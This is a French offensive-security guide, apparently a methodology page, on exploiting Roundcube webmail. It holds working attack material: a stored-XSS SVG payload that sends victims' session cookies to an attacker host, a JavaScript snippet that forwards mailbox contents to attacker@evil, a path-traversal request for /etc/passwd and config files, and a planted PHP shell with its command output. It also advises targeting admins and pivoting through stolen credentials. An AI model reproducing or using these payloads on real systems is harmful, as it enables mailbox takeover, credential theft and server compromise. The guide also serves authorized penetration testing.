---
title: "Roundcube : XSS stocké dans le rendu des messages et écriture de fichier vers PHP"
order: 1
description: "Attaquer le webmail Roundcube : identifier la version, XSS stocké via le sanitiseur HTML rcube_washtml (les contournements de style, SVG et attributs) qui se déclenche quand la victime ouvre un message forgé, traversée de chemin dans les skins et plugins, et les chemins installto et plugins qui écrivent du PHP sous la racine web pour l'exécution de code."
keywords:
  - roundcube xss
  - rcube_washtml bypass
  - roundcube path traversal
  - roundcube rce
  - stored xss email
---

# Roundcube

Roundcube est un client de webmail en PHP qui rend l'e-mail HTML dans le navigateur après l'avoir passé à travers son propre sanitiseur, `rcube_washtml` (« washtml »). Toute la surface à forte valeur en découle : si une construction survit à washtml, le script fourni par l'attaquant s'exécute à l'intérieur de la session authentifiée de la victime au moment où elle ouvre le message. Comme la délivrance se résume à envoyer du courrier, l'exploitation ne nécessite aucun clic sur un lien ni second facteur. À côté des bugs de rendu, le chargeur de skins et l'installeur de plugins de Roundcube ont régulièrement permis la traversée de chemin et l'écriture de PHP sous la racine web.

## Identifier d'abord

Confirmez le produit et épinglez la version exacte, car chaque contournement de washtml est lié à la version.

```bash
curl -sk 'https://<target>/?_task=login' -i | grep -iE 'set-cookie|location'
#   Set-Cookie: roundcube_sessid=...   confirms Roundcube
curl -sk https://<target>/CHANGELOG.md | head -n 5      # exact version on many installs
curl -sk https://<target>/program/resources/ -i         # 403/listing confirms layout
```

Le balisage fait aussi fuiter la version dans les chaînes de requête d'assets (`program/js/app.min.js?s=<buildhash>`) et le nom du skin sous `skins/`. La version sélectionne quel contournement du rendu des messages et quel chemin d'installeur sont actifs, notez-la donc avant d'envoyer quoi que ce soit.

## XSS stocké via le sanitiseur HTML

Roundcube affiche un message HTML en l'analysant, en exécutant `rcube_washtml` pour retirer le scripting, et en injectant le résultat dans la vue du message. Le sanitiseur fonctionne par liste d'autorisation des balises et attributs et réécriture des URL, de sorte que chaque bug pratique est un différentiel d'analyseur : une construction que l'analyseur washtml lit différemment du navigateur qui finit par la rendre. Classes historiques actives :

- **Gestionnaires d'événements et animation SVG.** Un sous-arbre `<svg>` portant un élément d'animation dont l'attribut d'événement n'est pas reconnu par washtml (par exemple `onbegin` sur `<animate>`, plutôt que les `onload`/`onerror` couramment retirés) passe la liste d'autorisation et se déclenche au rendu sans interaction utilisateur.
- **Mutation XSS via contenu étranger.** washtml autorise les sous-arbres `<svg>` et `<math>`, mais l'analyse de contenu étranger du navigateur réinterprète le balisage après la sanitisation : un `<style>` ou un commentaire à l'intérieur du sous-arbre se ferme à un point différent dans le DOM en direct que celui que washtml a vu, faisant passer clandestinement un élément suivant avec un gestionnaire `onerror` à travers le filtre.
- **Injection CSS pour l'exfiltration.** Un `style`/`<style>` qui survit ne peut pas exécuter de JavaScript dans un navigateur actuel, mais un `url()` dans un `background` ou un `@font-face` émet tout de même une requête contrôlée par l'attaquant quand le message est rendu, confirmant que le courrier a été ouvert et permettant l'exfiltration de valeurs d'attributs via des sélecteurs conditionnels.

Délivrez-le comme un message ordinaire. La charge utile est le corps du message ; elle s'exécute quand la cible ouvre le courrier :

```http
POST /?_task=mail&_action=send HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=x
Cookie: roundcube_sessid=<your-own-session>; roundcube_sessauth=<...>

--x
Content-Disposition: form-data; name="_to"

victim@target
--x
Content-Disposition: form-data; name="_subject"

Invoice
--x
Content-Disposition: form-data; name="_message"

<svg><animate onbegin="fetch('//attacker/x?c='+document.cookie)" attributeName=x dur=1s></svg>
--x--
```

Vous n'avez pas besoin de Roundcube pour l'envoyer ; tout chemin SMTP vers la victime fonctionne, et c'est la partie HTML forgée qui compte. Quand la victime ouvre le message, washtml échoue à neutraliser la construction et le navigateur l'exécute dans l'origine `https://<target>`. Un succès est visible sous forme d'une requête arrivant à votre collecteur portant les valeurs `roundcube_sessid`/`roundcube_sessauth` de la victime.

Volez la session et vous possédez la boîte aux lettres. La même charge utile, au lieu d'exfiltrer le cookie, peut piloter l'API AJAX de Roundcube dans la page pour lire les dossiers et envoyer silencieusement au nom de la victime :

```js
fetch('/?_task=mail&_action=send',{method:'POST',credentials:'include',
  body:new URLSearchParams({_to:'attacker@evil',_subject:'x',_message:dump})})
```

C'est la suite qui compte : du script dans l'origine de la boîte aux lettres équivaut à une lecture complète de chaque message et à l'envoi au nom de l'adresse de la victime, sans identifiant ni invite.

## Traversée de chemin dans les skins et plugins

Roundcube charge les modèles d'interface par un nom de `_skin`/template et, dans l'installeur et certains plugins, compose un chemin de système de fichiers à partir de l'entrée de la requête. Lorsque ce chemin n'est pas confiné, des séquences `../` lisent des fichiers hors du répertoire du skin :

```http
GET /?_task=settings&_action=edit-prefs&_skin=../../../../../../etc/passwd%00 HTTP/1.1
Host: target
Cookie: roundcube_sessid=<session>
```

Une traversée qui résout vers un fichier de configuration lisible renvoie le `config/config.inc.php` de Roundcube (DSN de la base, `des_key`) ou des fichiers système dans le corps de la réponse ; lisez le corps pour confirmer la fuite plutôt que de vous fier aux seuls codes de statut. La clé DES et les identifiants de base de données de cette configuration sont eux-mêmes une élévation : la clé signe la session et vous permet de forger ou de déchiffrer les identifiants stockés.

## Écriture de fichier vers PHP

Les chaînes Roundcube à plus fort impact se terminent par un fichier PHP sous la racine web, donnant une exécution de code OS en tant qu'utilisateur web. Deux sources récurrentes :

- **L'installeur de plugins / le chemin `installto`.** Les routines d'installation et de mise à jour qui écrivent des fichiers de plugin à partir de noms contrôlés par la requête permettent d'implanter une charge utile `.php` (ou de sortir du répertoire plugins) ensuite requise directement.
- **Un puits inscriptible atteint après authentification.** Des fonctionnalités comme `enigma` (import de clé) et `markasjunk` (qui peut invoquer une commande externe configurée) prennent des noms de fichiers ou des fragments de commande dans les préférences ; lorsque la valeur atteint une écriture de fichier ou un shell, une préférence forgée transforme une session connectée en écriture disque ou exécution de commandes.

Exemple guidé, en requérant le shell implanté après une écriture réussie :

```http
GET /plugins/enigma/home/.../shell.php?c=id HTTP/1.1
Host: target
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La réponse `www-data` confirme l'exécution en tant qu'utilisateur web. De là, le `config/config.inc.php` de Roundcube sur le disque vous remet les identifiants du back end IMAP/SMTP et la base, pivotant d'une seule boîte aux lettres vers tout le magasin de courrier.

## Notes d'exploitation

- Les bugs de rendu sont **côté client dans la session de la victime** : vous obtenez exactement les privilèges de la victime, ciblez donc un admin ou un utilisateur disposant d'un accès ultérieur, et enchaînez vers l'envoi au nom de la victime pour un hameçonnage latéral depuis une adresse de confiance.
- Les contournements de washtml sont **étroitement liés à la version**. Épinglez la version depuis `CHANGELOG.md`/les hachages d'assets d'abord ; une charge utile pour une version mineure est généralement morte sur la suivante.
- Les chaînes d'écriture de fichier s'exécutent en tant qu'**utilisateur web** et nécessitent une session valide (souvent à faible privilège) ; combinez avec le XSS pour obtenir cette session, ou avec des identifiants obtenus par pulvérisation.
- `config/config.inc.php` est le pivot : sa `des_key` et ses identifiants de base/IMAP convertissent l'accès à la boîte aux lettres en accès au back end.

## Outils

- [roundcube/roundcubemail (source, pour comparer washtml entre versions)](https://github.com/roundcube/roundcubemail)
- Le repeater de Burp Suite pour façonner et renvoyer le corps de message multipart.

## Références

- [SonarSource : recherche de sécurité sur le webmail Roundcube](https://www.sonarsource.com/blog/)
- [Avis de sécurité roundcube/roundcubemail](https://github.com/roundcube/roundcubemail/security/advisories)
- [PortSwigger : XSS réfléchi et stocké](https://portswigger.net/web-security/cross-site-scripting/stored)
